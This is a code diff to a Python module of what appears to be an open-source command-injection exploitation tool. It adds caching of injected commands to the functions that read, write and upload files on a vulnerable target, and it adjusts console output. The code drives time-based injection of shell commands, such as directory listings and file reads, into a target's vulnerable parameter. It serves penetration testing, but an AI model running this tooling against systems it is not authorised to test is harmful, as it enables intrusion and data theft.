@@ -20,6 +20,7 @@ import urllib2
 
 from src.utils import menu
 from src.utils import settings
+from src.utils import session_handler
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector
@@ -40,8 +41,15 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
     cmd = settings.WIN_FILE_READ + file_to_read
   else:
     cmd = settings.FILE_READ + file_to_read 
-  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
-  shell = output 
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # The main command injection exploitation.
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    session_handler.store_cmd(url, cmd, output, vuln_parameter)
+    new_line = "\n"
+  else:
+    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
+    new_line = ""
+  shell = output
   try:
     shell = "".join(str(p) for p in shell)
   except TypeError:
@@ -49,7 +57,7 @@ def file_read(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
   if menu.options.verbose:
     print ""
   if shell:
-    sys.stdout.write(Style.BRIGHT + "\n\n (!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + Style.BRIGHT + "'" + Style.RESET_ALL + " : ")
+    sys.stdout.write(Style.BRIGHT + new_line + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + Style.BRIGHT + "'" + Style.RESET_ALL + " : ")
     sys.stdout.flush()
     print shell
     output_file = open(filename, "a")
@@ -131,19 +139,17 @@ def file_write(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_
     # Check if file exists
     cmd = "echo $(ls " + dest_to_write + ")"
 
-  # Check if defined cookie injection.
-  if menu.options.verbose:
-    print ""
+  print ""
   check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
   shell = output 
   try:
     shell = "".join(str(p) for p in shell)
   except TypeError:
     pass
-  if menu.options.verbose:
-    print ""
+  # if menu.options.verbose:
+  #   print ""
   if shell:
-    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + "' file was created successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "\n(!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + "' file was created successfully!\n" + Style.RESET_ALL)
     sys.stdout.flush()
   else:
    sys.stdout.write(Fore.YELLOW + "\n" + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_write + "' file." + Style.RESET_ALL + "\n")
@@ -185,16 +191,18 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request
       cmd = "dir " + dest_to_upload + ")"
     else:  
       cmd = "echo $(ls " + dest_to_upload + ")"
+      
+    print ""  
     check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     shell = output 
     try:
       shell = "".join(str(p) for p in shell)
     except TypeError:
       pass
-    if menu.options.verbose:
-      print ""
+    # if menu.options.verbose:
+    #   print ""
     if shell:
-      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + "' file was uploaded successfully!" + Style.RESET_ALL + "\n")
+      sys.stdout.write(Style.BRIGHT + "\n(!) The '" + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + "' file was uploaded successfully!" + Style.RESET_ALL + "\n")
       sys.stdout.flush()
     else:
      sys.stdout.write(Fore.YELLOW + "\n" + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_upload + "' file." + Style.RESET_ALL + "\n")
@@ -204,28 +212,20 @@ def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request
 Check the defined options
 """
 def do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
-  if settings.FILE_ACCESS_DONE == True:
-    settings.FILE_ACCESS_DONE = False
-    
+
   if menu.options.file_read:  
     file_read(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
-    settings.FILE_ACCESS_DONE = True
+    if settings.FILE_ACCESS_DONE == False:
+      settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_write:
-    if settings.FILE_ACCESS_DONE == True:
-     print ""
     file_write(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.FILE_ACCESS_DONE == False:
       settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
-    if settings.FILE_ACCESS_DONE == True:
-      print ""
     file_upload(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     if settings.FILE_ACCESS_DONE == False:
       settings.FILE_ACCESS_DONE = True
-
-  if settings.FILE_ACCESS_DONE == True:
-    print ""
 
 # eof
